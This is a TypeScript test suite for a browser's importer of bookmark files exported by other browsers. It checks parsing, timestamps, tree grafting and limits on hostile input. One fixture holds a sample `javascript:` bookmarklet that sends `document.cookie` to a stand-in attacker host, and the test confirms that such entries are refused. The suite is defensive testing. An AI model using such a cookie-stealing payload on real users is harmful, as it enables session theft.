import { describe, expect, it } from 'vitest'
import {
  MAX_IMPORT_LENGTH,
  decodeHtmlEntities,
  graftImportedBookmarks,
  importCapacity,
  parseNetscapeBookmarks
} from '@shared/bookmarks/import.js'
import {
  BOOKMARK_BAR_ID,
  BOOKMARK_OTHER_ID,
  MAX_BOOKMARKS,
  childrenOf,
  rootIdOf,
  type Bookmark
} from '@shared/bookmarks/model.js'

/**
 * Reading a bookmark file exported by another browser.
 *
 * The file is untrusted input, and the two things it can carry that matter are a `javascript:`
 * bookmarklet dressed up as an ordinary bookmark and enough markup to stall the main process.
 * Both have their own test here. The rest of the file is about the format being malformed by
 * design — `<DT>` is never closed and `<p>` appears as a stray opening tag — which is why a
 * tolerant scanner is right and a strict parser would reject real exports.
 */

const T0 = 1_700_000_000_000

/** A file in the shape Chrome writes. */
const CHROME_EXPORT = `<!DOCTYPE NETSCAPE-Bookmark-file-1>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1>Bookmarks</H1>
<DL><p>
    <DT><H3 ADD_DATE="1600000000" PERSONAL_TOOLBAR_FOLDER="true">Bookmarks bar</H3>
    <DL><p>
        <DT><A HREF="https://news.example/" ADD_DATE="1600000001">News</A>
        <DT><H3 ADD_DATE="1600000002">Work</H3>
        <DL><p>
            <DT><A HREF="https://tickets.example/board">Tickets</A>
        </DL><p>
    </DL><p>
    <DT><A HREF="https://elsewhere.example/">Elsewhere</A>
</DL><p>`

function graft(html: string, nodes: readonly Bookmark[] = []): ReturnType<typeof graftImportedBookmarks> {
  let counter = 0
  return graftImportedBookmarks([...nodes], parseNetscapeBookmarks(html), {
    nextId: () => {
      counter += 1
      return `i${counter}`
    },
    now: T0,
    folderTitle: 'Imported bookmarks'
  })
}

describe('parsing an exported file', () => {
  it('reads folders, nesting and bookmarks out of a Chrome export', () => {
    const report = parseNetscapeBookmarks(CHROME_EXPORT)
    expect(report.skipped).toBe(0)
    expect(report.nodes.map((node) => node.title)).toEqual(['Bookmarks bar', 'Elsewhere'])

    const [bar] = report.nodes
    expect(bar?.onToolbar).toBe(true)
    expect(bar?.children.map((child) => child.title)).toEqual(['News', 'Work'])
    const work = bar?.children[1]
    expect(work?.children.map((child) => child.url)).toEqual(['https://tickets.example/board'])
  })

  it('reads ADD_DATE as seconds, not milliseconds', () => {
    /*
      The trap in the format. Taken as milliseconds, every imported bookmark would claim to
      have been created in January 1970 — so a fresh import would sort to the very bottom for
      ever, and the age-based prune would consider it the first thing to throw away.
    */
    const [bar] = parseNetscapeBookmarks(CHROME_EXPORT).nodes
    expect(bar?.addedAt).toBe(1_600_000_000_000)
    expect(bar?.children[0]?.addedAt).toBe(1_600_000_001_000)
  })

  it('ignores an ADD_DATE that is not a timestamp', () => {
    const report = parseNetscapeBookmarks(
      '<DL><DT><A HREF="https://a.example/" ADD_DATE="soon">A</A></DL>'
    )
    expect(report.nodes[0]?.addedAt).toBeNull()
    const zero = parseNetscapeBookmarks('<DL><DT><A HREF="https://a.example/" ADD_DATE="0">A</A></DL>')
    expect(zero.nodes[0]?.addedAt).toBeNull()
  })

  it('refuses a bookmarklet and says how many it refused', () => {
    /*
      The reason the import path is a security boundary at all.

      A `javascript:` bookmark runs in the origin of whatever page is open when it is clicked,
      so importing one named "Invoices" is a stored cross-site-scripting primitive with a
      friendly label. Counted rather than dropped in silence: a file that half-arrived with no
      explanation is not something a user can investigate.
    */
    const report = parseNetscapeBookmarks(`<DL>
      <DT><A HREF="javascript:fetch('https://evil.example/'+document.cookie)">Invoices</A>
      <DT><A HREF="data:text/html,<script>x()</script>">Report</A>
      <DT><A HREF="place:type=6&amp;sort=14">Recent tags</A>
      <DT><A HREF="https://good.example/">Good</A>
    </DL>`)

    expect(report.nodes.map((node) => node.url)).toEqual(['https://good.example/'])
    expect(report.skipped).toBe(3)
  })

  it('refuses an anchor with no address at all', () => {
    const report = parseNetscapeBookmarks('<DL><DT><A NAME="anchor">Not a link</A></DL>')
    expect(report.nodes).toEqual([])
    expect(report.skipped).toBe(1)
  })

  it('decodes the entities a title really contains', () => {
    const report = parseNetscapeBookmarks(
      '<DL><DT><A HREF="https://a.example/">AT&amp;T &lt;b&gt; &quot;x&quot; &#65; &#x42;</A></DL>'
    )
    expect(report.nodes[0]?.title).toBe('AT&T <b> "x" A B')
  })

  it('leaves an entity it does not know as it stands', () => {
    // A title reading `&hellip;` is a cosmetic flaw; one reading `�` is a bug report.
    expect(decodeHtmlEntities('a &hellip; b')).toBe('a &hellip; b')
    // A numeric reference outside Unicode, and a lone surrogate: `String.fromCodePoint` throws
    // on both, and a parser that throws on one bad title loses the whole file.
    expect(decodeHtmlEntities('&#1114112;')).toBe('&#1114112;')
    expect(decodeHtmlEntities('&#xD800;')).toBe('&#xD800;')
  })

  it('decodes entities inside an address as well as inside a title', () => {
    const report = parseNetscapeBookmarks(
      '<DL><DT><A HREF="https://a.example/?x=1&amp;y=2">A</A></DL>'
    )
    expect(report.nodes[0]?.url).toBe('https://a.example/?x=1&y=2')
  })

  it('strips the markup a title can be wrapped in', () => {
    const report = parseNetscapeBookmarks('<DL><DT><A HREF="https://a.example/"><B>Bold</B></A></DL>')
    expect(report.nodes[0]?.title).toBe('Bold')
  })

  it('reads an unquoted and a single-quoted attribute', () => {
    // Exporters disagree about quoting, and every browser accepts all three forms.
    const bare = parseNetscapeBookmarks('<DL><DT><A HREF=https://a.example/ >A</A></DL>')
    expect(bare.nodes[0]?.url).toBe('https://a.example/')
    const single = parseNetscapeBookmarks("<DL><DT><A HREF='https://b.example/'>B</A></DL>")
    expect(single.nodes[0]?.url).toBe('https://b.example/')
  })

  it('survives more closing tags than opening ones', () => {
    /*
      A truncated or hand-edited file.

      Without the guard in the scanner this pops past the root and starts writing into
      nothing — which in JavaScript is not an error but a silently discarded import.
    */
    const report = parseNetscapeBookmarks(`</DL></DL><DL>
      <DT><A HREF="https://a.example/">A</A>
    </DL></DL></DL>`)
    expect(report.nodes.map((node) => node.title)).toEqual(['A'])
  })

  it('treats a list with no folder heading as part of what is already open', () => {
    // A nameless folder in the middle of an import would be a row the user cannot identify.
    const report = parseNetscapeBookmarks(`<DL>
      <DT><A HREF="https://a.example/">A</A>
      <DL>
        <DT><A HREF="https://b.example/">B</A>
      </DL>
    </DL>`)
    expect(report.nodes.map((node) => node.title)).toEqual(['A', 'B'])
  })

  it('lets only the first folder claim the toolbar', () => {
    // A merged or hand-edited export can claim it twice, and which one won would otherwise
    // depend on document order — so the bar would be split across both.
    const report = parseNetscapeBookmarks(`<DL>
      <DT><H3 PERSONAL_TOOLBAR_FOLDER="true">First</H3><DL><DT><A HREF="https://a.example/">A</A></DL>
      <DT><H3 PERSONAL_TOOLBAR_FOLDER="true">Second</H3><DL><DT><A HREF="https://b.example/">B</A></DL>
    </DL>`)
    expect(report.nodes.map((node) => node.onToolbar)).toEqual([true, false])
  })

  it('reads a file that is not a bookmark file as nothing to import', () => {
    // Distinguishable from a rejection: no nodes and nothing skipped is "there was nothing in
    // it", which is a different message from "the file was refused".
    const report = parseNetscapeBookmarks('<html><body><p>Hello.</p></body></html>')
    expect(report).toEqual({ nodes: [], skipped: 0 })
  })

  it('stops scanning past the size ceiling', () => {
    /*
      A hundred megabytes of anchors is a main process that stops answering.

      The bookmark that follows the ceiling is not read, which is the point: the cost of a
      hostile file is bounded before the tree is built rather than after.
    */
    const filler = '<DT><A HREF="https://a.example/">A</A>'.repeat(1)
    const html = `<DL>${filler}${' '.repeat(MAX_IMPORT_LENGTH)}<DT><A HREF="https://past.example/">Past</A></DL>`
    const report = parseNetscapeBookmarks(html)
    expect(report.nodes.map((node) => node.url)).toEqual(['https://a.example/'])
  })
})

describe('grafting a parsed tree into a document', () => {
  it('puts the exporting browser’s toolbar on our bar and the rest in one folder', () => {
    /*
      Two routing decisions, both about what somebody importing expects to see.

      Chrome's bar becomes this browser's bar rather than a folder one click away from it, and
      everything else lands in a single named folder so the user can tell afterwards which rows
      arrived and which were already theirs.
    */
    const result = graft(CHROME_EXPORT)
    const bar = childrenOf(result.nodes, BOOKMARK_BAR_ID)
    expect(bar.map((node) => node.title)).toEqual(['News', 'Work'])

    const other = childrenOf(result.nodes, BOOKMARK_OTHER_ID)
    expect(other.map((node) => node.title)).toEqual(['Imported bookmarks'])
    const [folder] = other
    expect(childrenOf(result.nodes, folder?.id ?? '').map((node) => node.title)).toEqual([
      'Elsewhere'
    ])
  })

  it('preserves depth and order', () => {
    const result = graft(CHROME_EXPORT)
    const work = result.nodes.find((node) => node.title === 'Work')
    expect(childrenOf(result.nodes, work?.id ?? '').map((node) => node.title)).toEqual(['Tickets'])
    expect(rootIdOf(result.nodes, work?.id ?? '')).toBe(BOOKMARK_BAR_ID)
  })

  it('carries the exporting browser’s timestamps', () => {
    const result = graft(CHROME_EXPORT)
    const news = result.nodes.find((node) => node.title === 'News')
    expect(news?.createdAt).toBe(1_600_000_001_000)
    // And falls back to the import time for an entry the file dated not at all.
    const tickets = result.nodes.find((node) => node.title === 'Tickets')
    expect(tickets?.createdAt).toBe(T0)
  })

  it('counts what it imported and what it refused', () => {
    const result = graft(`<DL>
      <DT><A HREF="https://good.example/">Good</A>
      <DT><A HREF="javascript:void 0">Bad</A>
    </DL>`)
    // One folder plus one bookmark.
    expect(result.imported).toBe(2)
    expect(result.skipped).toBe(1)
  })

  it('adds nothing at all to an empty file, not even the folder', () => {
    const result = graft('<html></html>')
    expect(result.nodes).toEqual([])
    expect(result.imported).toBe(0)
  })

  it('imports as much as fits and counts the rest as skipped', () => {
    /*
      A file larger than the document can hold.

      Importing what fits and saying how much did not is the honest behaviour; the
      alternatives are refusing the whole file or silently truncating it.
    */
    const full: Bookmark[] = Array.from({ length: MAX_BOOKMARKS - 1 }, (_unused, index) => ({
      id: `n${index}`,
      kind: 'bookmark' as const,
      title: 't',
      url: `https://example.com/${index}`,
      parentId: BOOKMARK_OTHER_ID,
      createdAt: T0 + index
    }))
    expect(importCapacity(full)).toBe(1)

    const html = `<DL>${Array.from(
      { length: 5 },
      (_unused, index) => `<DT><A HREF="https://new.example/${index}">N${index}</A>`
    ).join('')}</DL>`

    const result = graft(html, full)
    // Room for the wrapping folder and nothing else.
    expect(result.imported).toBe(1)
    expect(result.skipped).toBe(5)
    expect(result.nodes).toHaveLength(MAX_BOOKMARKS)
  })

  it('counts a whole refused subtree, not just its folder', () => {
    const full: Bookmark[] = Array.from({ length: MAX_BOOKMARKS }, (_unused, index) => ({
      id: `n${index}`,
      kind: 'bookmark' as const,
      title: 't',
      url: `https://example.com/${index}`,
      parentId: BOOKMARK_OTHER_ID,
      createdAt: T0 + index
    }))
    expect(importCapacity(full)).toBe(0)

    const result = graft(
      `<DL><DT><H3>Folder</H3><DL><DT><A HREF="https://a.example/">A</A><DT><A HREF="https://b.example/">B</A></DL></DL>`,
      full
    )
    expect(result.imported).toBe(0)
    // The wrapping folder could not be created, so the three nodes behind it are all refused.
    expect(result.skipped).toBe(3)
  })

  it('does not overflow the stack on a deeply nested file', () => {
    /*
      Nesting depth comes from the file, and the file is untrusted.

      A recursive graft would be a `RangeError` in the main process here, which is why both the
      graft and the node count are explicit loops.
    */
    const depth = 5_000
    const html = `<DL>${'<DT><H3>F</H3><DL>'.repeat(depth)}${'</DL>'.repeat(depth)}</DL>`
    expect(() => graft(html)).not.toThrow()
  })
})
